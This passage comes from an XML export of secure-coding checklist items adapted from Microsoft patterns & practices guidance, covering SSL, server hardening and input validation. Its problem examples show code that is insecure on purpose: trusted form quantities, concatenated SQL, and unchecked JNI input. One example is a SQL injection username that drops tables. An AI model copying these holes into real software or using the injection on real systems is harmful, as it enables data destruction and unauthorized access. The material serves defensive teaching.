&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;Widget shopping cart&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;H1&amp;gt;Welcome to the most boring shopping cart on the web!&amp;lt;/H1&amp;gt;&lt;br&gt;     A widget's current price is $19.95 USD. Please use the following form to submit an order.&lt;br&gt;    &amp;lt;form action=&amp;quot;process_order.aspx&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;br&gt;       &amp;lt;p&amp;gt;Please enter the number of widgets you would like to purchase:&amp;lt;/p&amp;gt;&lt;br&gt;      quantity:&amp;lt;br/&amp;gt;&lt;br&gt;      &amp;lt;select name=&amp;quot;WidgetQuantity&amp;quot;&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;1&amp;quot;&amp;gt;1&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;2&amp;quot;&amp;gt;2&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;3&amp;quot;&amp;gt;3&amp;lt;/option&amp;gt;&lt;br&gt;        &amp;lt;option value=&amp;quot;4&amp;quot;&amp;gt;4&amp;lt;/option&amp;gt;&lt;br&gt;      &amp;lt;/select&amp;gt;&lt;br&gt;      ...&lt;br&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;order&amp;quot;/&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;An ASP.NET page that processes the form submissions and performs the necessary steps to create the order.&lt;/p&gt;
&lt;pre&gt;int dQuantity = Request(&amp;quot;WidgetQuantity&amp;quot;);&lt;br&gt;double dPrice = 19.95;&lt;br&gt;double dCost = dQuantity * dPrice;&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;This server side page is problematic because it lacks validation to ensure the quantity field is correct. The application works fine in the case where a user plays by the rules and submits the form as it is shown, because the quantity field ensures that
 the range constraints for the order quantity are always valid. However, if a clever user decides to construct their own form and submits a negative WidgetQuantity field, it causes a negative balance. Depending on what e-commerce system is used, this could
 result in a credit to the user's account. It also might subtract the negative balance from the company's inventory, which would carry significant ramifications and costs later on.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>50e1e9c6-a9d9-489a-8fcf-ceacf3073865</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SSL is Used to Protect User Credentials and Authentication Cookies</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that SSL is used to protect authentication credentials and authentication cookies passed between browser and server.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By using SSL, you make it much more difficult for an attacker to monitor the network connection&amp;nbsp;to&amp;nbsp;capture authentication credentials and authentication cookies to gain spoofed access to your application.
&lt;/p&gt;
&lt;p&gt;SSL also can improve user trust in your application as it authenticates the server to the client, thus proving the end point for communications.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;To ensure the forms authentication credentials and the forms authentication cookie is passed from browser to server with SSL, use the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Ensure that the authentication cookie is passed only over HTTPS connections. &lt;/li&gt;&lt;li&gt;Ensure that the &lt;strong&gt;SSLOnly&lt;/strong&gt; attribute is set&amp;nbsp;on all authentication and authorization cookies.&amp;nbsp;
&lt;/li&gt;&lt;li&gt;Ensure that all login forms, password change forms, role/authorization request, editing forms, or other authentication-required pages are only available over SSL and only accept submissions via SSL.&amp;nbsp;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Perform the following tasks to assure that SSL is used to protect user credentials and authentication cookies:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Restrict the authentication cookie to HTTPS connections. &lt;/strong&gt;Cookies support a &amp;quot;secure&amp;quot; property that determines whether or not browsers should send the cookie back to the server. With the secure property set, the cookie is sent by the browser
 only to a secure page that is requested using an HTTPS URL.&lt;/p&gt;
&lt;p&gt;Set the secure property by using &lt;strong&gt;requireSSL=&amp;quot;true&amp;quot;&lt;/strong&gt; on the &lt;strong&gt;
&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;       requireSSL=&amp;quot;true&amp;quot; . . . /&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the cookie and check its integrity. &lt;/strong&gt;Encrypt the cookie and check its integrity, even if you are using SSL. This prevents an attacker from viewing or modifying the cookie if he or she manages to steal it through a XSS exploit, which
 would allow&amp;nbsp;the attacker&amp;nbsp;to still use the cookie to gain access to your application. The best way to mitigate this risk is to implement the appropriate countermeasures to prevent XSS attacks (described under &amp;quot;Cross-Site Scripting&amp;quot; earlier in this chapter),
 and limit the cookie lifetime as described in the next recommendation.&lt;/p&gt;
&lt;p&gt;To provide privacy and integrity for the cookie, set the &lt;strong&gt;protection&lt;/strong&gt; attribute on the
&lt;strong&gt;&amp;lt;forms&amp;gt;&lt;/strong&gt; element as follows:&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms protection=&amp;quot;All&amp;quot;    Privacy and integrity&lt;/pre&gt;
&lt;p&gt;A secure &amp;lt;&lt;strong&gt;forms&lt;/strong&gt;&amp;gt; element configuration is shown here:&lt;/p&gt;
&lt;pre&gt;&amp;lt;forms loginUrl=&amp;quot;Secure\Login.aspx&amp;quot;&lt;br&gt;       protection=&amp;quot;All&amp;quot;&lt;br&gt;       requireSSL=&amp;quot;true&amp;quot;&lt;br&gt;       timeout=&amp;quot;00:30:00&amp;quot;&lt;br&gt;       slidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;       name=&amp;quot;YourAppName&amp;quot;&lt;br&gt;       path=&amp;quot;/Secure&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:09f08059-6ebb-4317-9ed5-016cc1abd2a7"&gt;Guideline: Use SSL to Protect User Credentials and Authentication Cookies&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5251a1f6-3b58-4a6c-a4e4-e9e6f8dc3e29</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Internet-facing interfaces are restricted to port 80 (and 443 if SSL is used).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that access to Internet-facing interfaces are restricted to port 80 for HTTP and port 443 for HTTPS (SSL).&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Limit inbound traffic to port 80 for HTTP and port 443 for HTTPS (SSL).&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For outbound (Internet-facing) NICs, use IPSec or TCP filtering. For more information, see &amp;quot;&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302366.aspx"&gt;How To: Use&amp;nbsp;IPSec&amp;nbsp;for&amp;nbsp;Filtering&amp;nbsp;Ports and&amp;nbsp;Authentication&lt;/a&gt;&amp;quot;.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>53748e6e-6cf8-47cd-82bb-1681bf43bc44</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SSL is Used When Transmitting Credentials</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that credentials are never sent via unencrypted connections. SSL should be used when transmitting credentials.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL prevents the credentials from being sniffed or tampered with as they are transmitted over the network. If SSL is not used, user credentials may be compromised by attacks such as a
&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Network Credential Sniffing Attack&lt;/a&gt; or a
&lt;a href="?#ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197" name="x_Phishing_Attack"&gt;
Phishing Attack&lt;/a&gt;. Additionally, use the &lt;a href="?#ruledisplay:BB960347-F2E9-4926-8B75-ECCEE36D3EE8"&gt;
Protect Session Cookies&lt;/a&gt; guideline to minimize the risk of exposing your application's session cookies to an attacker.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that a dedicated SSL enabled server is used for the authentication component of your application.&lt;/strong&gt; Check that the server uses valid SSLv3 certificates that have been signed by a trusted certification authority. Ensure that your application's
 authentication component runs on a dedicated subdomain and a server that accepts only HTTPS traffic. Disallowing unencrypted HTTP connections will prevent accidental or malicious unsecured connections. Disallowing lower SSL versions, such as SSLv1 and SSLv2
 will ensure that weaker encryption methods can not be exploited by an attacker.&lt;/p&gt;
&lt;p&gt;The following URL should connect and prompt for login credentials: &lt;/p&gt;
&lt;pre&gt;https://login.example.com/myapp/login.aspx&lt;/pre&gt;
&lt;p&gt;An HTTP URL to the same server and component should either be disallowed or redirect to its HTTPS counterpart:&lt;/p&gt;
&lt;pre&gt;http://login.example.com/myapp/login.aspx&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify forms that send credentials.&lt;/strong&gt; Forms are defined by a &amp;lt;form&amp;gt; tag in the HTML document, such as the one below:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/login.aspx&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;p&gt;Forms that include credentials usually, but won't always, include an input field with a TYPE attribute set to &amp;quot;password&amp;quot;:
&lt;/p&gt;
&lt;pre&gt;&amp;lt;input &lt;strong&gt;type&lt;/strong&gt;=&amp;quot;&lt;strong&gt;password&lt;/strong&gt;&amp;quot; name=&amp;quot;pass&amp;quot; size=25&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that form data is sent using HTTPS.&lt;/strong&gt; Verify that the &lt;strong&gt;
requireSSL&lt;/strong&gt; attribute inside the &amp;lt;forms&amp;gt; element of your application's &lt;strong&gt;
web.config&lt;/strong&gt; is set to &lt;strong&gt;true&lt;/strong&gt;:&lt;/p&gt;
&lt;div&gt;&lt;br&gt;
&lt;pre&gt;&amp;lt;authentication mode=&amp;quot;Forms&amp;quot;&amp;gt;&lt;br&gt;   &amp;lt;forms loginUrl=&lt;a href="https://login.example.com/myapp/login.aspx"&gt;https://login.example.com/myapp/login.aspx&lt;/a&gt;&lt;br&gt;           requireSSL=&amp;quot;true&amp;quot;&lt;br&gt;           ... /&amp;gt;&lt;br&gt;&amp;lt;/authentication&amp;gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following snippet is part of an application's web.config. The application uses form based authentication and has configured its &amp;lt;forms&amp;gt; element accordingly. Unfortunately, the &amp;lt;forms&amp;gt; element does not have the requireSSL attribute set to true. Therefore
 the application fails to enforce the use of SSL when performing form-based authentication.&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- The forms element does not have a requireSSL attribute --&amp;gt;&lt;br&gt;&amp;lt;forms loginUrl=&amp;quot;Secure/Login.aspx&amp;quot;&lt;br&gt;       protection=&amp;quot;All&amp;quot;&lt;br&gt;       timeout=&amp;quot;00:30:00&amp;quot;&lt;br&gt;        slidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;       name=&amp;quot;MyApp&amp;quot;&lt;br&gt;       path=&amp;quot;/Secure&amp;quot;&lt;br&gt; /&amp;gt;&lt;/pre&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:B9E7568A-907C-43C9-9CED-F0CCA09F76CB"&gt;Guideline: Use SSL When Transmitting Credentials&amp;nbsp;&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>54a6cd2c-55f1-4d71-b566-29e28711f98e</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>IIS Log Files are relocated to a non-system NTFS volume and Secured</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that log files are located on a non-system NTFS volume and not on the same volume where the Web site content resides.&amp;nbsp;
&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;By moving and renaming the IIS log files, you make it much more difficult for an attacker to cover his tracks. The attacker must locate the log files before he or she can alter them. To make an attacker's task more difficult still, use NTFS permissions to
 secure the log files.&lt;/p&gt;
&lt;p&gt;Move and rename the IIS log file directory to a different volume than your Web site. Do not use the system volume. Then, apply the following NTFS permissions to the log files folder and subfolders.
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Administrators: Full Control &lt;/li&gt;&lt;li&gt;System: Full Control &lt;/li&gt;&lt;li&gt;Backup Operators: Read &lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>56b0552d-2ceb-4714-a8f1-20a6a8609874</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Database Input is Validated</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure all input is validated before it is passed to the database.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unvalidated input can lead to persistent cross-site scripting, SQL injection and other vulnerabilities&amp;nbsp;that could allow an attacker to gain unauthorized access to sensitive data.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Follow these steps to ensure that all input passed to database is validated:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input to the database. &lt;/strong&gt;An application can have various sources of input. Each of these sources is an entry point to your application and can potentially be used to break your application's security model. Determine
 all sources of input&amp;nbsp;that&amp;nbsp;are eventually pushed to the database.&lt;/p&gt;
&lt;p&gt;Potential sources of input in a web application typically include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers &lt;/li&gt;&lt;li&gt;Data stored on the local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other related services&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that validators have been used to check the input. &lt;/strong&gt;Check that a content-specific validator has been placed at each entry point.&lt;br&gt;
Each database input source should have a data validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating many spread throughout your code base,
 so check for consolidation of routines to aid testing. If a database input source does not have a validation routine associated with it, flag it for fixing.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that type-safe parameters and stored procedures are used. &lt;/strong&gt;
Check that stored procedures and parametrized queries have been implemented instead of using the input values directly in constructing dynamic SQL queries as the latter is prone to SQL injection.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that database entry paths have been audited. &lt;/strong&gt;Get a 3rd party reviewer to verify that all the database input paths have been identified and that validators have been correctly implemented for all entry points.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a given username and password. It hashes the password with a random salt. Then it compares the username and the produced hash against the data stored in the backend database.&lt;/p&gt;
&lt;p&gt;Unfortunately, the SQL query is dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.&lt;/p&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      byte[] salt = MyApp.generateSalt();&lt;br&gt;      String passHash;&lt;br&gt;      SqlConnection cn;&lt;br&gt;      SqlCommand sqlCommand;&lt;br&gt;      String query;&lt;br&gt;      passHash = hashCredentials(pass, salt);&lt;br&gt;      // The application crafts the SQL query based on user's input&lt;br&gt;      cn = MyApp.getDBConnection();&lt;br&gt;      sqlCommand = new SqlCommand(&amp;quot;select user from myappUsers where user = \&amp;quot;&amp;quot; &amp;#43; user &amp;#43; &amp;quot;\&amp;quot;&lt;br&gt;                                     &amp;#43; and pass = \&amp;quot;&amp;quot; &amp;#43; passHash &amp;#43; &amp;quot;\&amp;quot; and login_attempts &amp;lt; 3;&amp;quot;, cn);&lt;br&gt;      SqlDataReader reader = sqlCommand.ExecuteReader();&lt;br&gt;      updateLastLoginAttempt(user);&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;If a user submits a login request with a username of 'foo\&amp;quot; or 1 = 1; drop table *; --', the system will happily first authenticate the user and then drop all the tables in the database.&lt;/p&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:F1B74837-9A72-4745-A149-EC5D8C476EB7"&gt;Guideline: Validate All Input Passed to Database (ASP.NET)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>57b928e2-5bc1-4d98-b3df-c7cca05dc5a8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Data Passed Between Native and Java Code is Validated</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Unmanaged Code</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Verify that your application validates all data that is passed between Java code and native code.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unchecked input and/or output can lead to buffer overflows, injection based attacks such as SQL injection, cross-site scripting, etc., that exploit weaknesses in the application.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Due to the security risk posed by the use of native code, verify that your application validates data that is passed between native code and Java:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if language boundaries are clearly defined. &lt;/strong&gt;If your Java application needs to use native code, ensure that you have identified all the locations where the Java code interacts with native code. As your application moves between Java
 code and native code, special attention needs to be given to error handling routines, so that no security holes are introduced in your application by its native component.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify the quality of your application's validators. &lt;/strong&gt;Using the
&lt;a href="?#ruledisplay:6D944640-22E7-421F-8192-45730D5118AB"&gt;Input is Validated for Length, Range, Format and Type&lt;/a&gt; checklist, verify that your application's data is properly validated for length, range, format and type.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that all data is validated. &lt;/strong&gt;Using the &lt;a href="?#ruledisplay:178EB28D-4F49-4476-AE8A-437F966DE577"&gt;
Input from All Sources is Validated&lt;/a&gt; checklist, verify that all data passing through the locations identified in Step 1 is validated.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that data validation code is centralized. &lt;/strong&gt;It is better that all validation routines in your application are centralized for cleaner and better control. Shared validation routines are better than creating many spread throughout your
 application's code base. Every time your application accepts external data as input, it should first pass through this set of validation routines.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment shows a JNI code that utilizes a COM object. Making the assumption that the Java code will handle data validation, the JNI segment does not verify that the passed input is a valid GUID. Since invalid GUIDs may cause unhandled exceptions,
 an attacker can force the application to disclose its call stack and possibly its source filenames.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;#include &amp;lt;jni.h&amp;gt;&lt;br&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;br&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;br&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;#include &amp;lt;atlbase.h&amp;gt;&lt;br&gt;#include &amp;lt;windows.h&amp;gt;&lt;br&gt;#include &amp;lt;wtypes.h&amp;gt;&lt;br&gt;JNIEXPORT jboolean&lt;br&gt;JNICALL Java_Identifier_invokeObject&lt;br&gt;       (JNIEnv * env, jobject jobj, jstring jguid)&lt;br&gt;{&lt;br&gt;      HRESULT result;&lt;br&gt;      CLSID clsid;&lt;br&gt;      IUnknown *pIunkn;&lt;br&gt;      LPWSTR guid;&lt;br&gt;      jboolean iscopy;&lt;br&gt;      jboolean ret = false;&lt;br&gt;      char* temp_guid = (*env)-&amp;gt;GetStringUTFChars(env, jguid, &amp;amp;iscopy);&lt;br&gt;      //The application fails to verify that the GUID is valid&lt;br&gt;      guid = SysAllocStringLen(0, 38);&lt;br&gt;      MultiByteToWideChar(CP_ACP, 0, temp_guid, -1, guid, 38);&lt;br&gt;      result = GUIDFromString(guid, &amp;amp;clsid);&lt;br&gt;       ...&lt;br&gt;      return ret;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about the security issues that JNI introduces, see: &lt;a href="http://www.owasp.org/index.php/Unsafe_JNI"&gt;
Unsafe JNI&lt;/a&gt; from OWASP. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F"&gt;Guideline: Validate All Data Passed Between Native and Java Code (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5ba2eb64-53fb-4578-83cb-e796026784d4</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All unnecessary shares are removed (including default administration shares).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</author>
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that all unnecessary shares including default administration shares&amp;nbsp;are removed.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Remove all unnecessary shares. To review shares and associated permissions, run the Computer Management MMC snap-in, and select
&lt;strong&gt;Shares&lt;/strong&gt; from &lt;strong&gt;Shared&lt;/strong&gt; &lt;strong&gt;Folders&lt;/strong&gt; as shown below.&lt;/p&gt;
&lt;p&gt;&lt;img src="http://msdn2.microsoft.com/en-us/library/Aa302432.f16thcm03(en-us,MSDN.10).gif" style="border:1px solid #000"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Computer Management MMC snap-in Shares&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>5ce93f58-53f1-4cb6-acac-b15f71b79bc7</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Access to the Credential Store is Limited....</title>
    <topic>Security</topic>
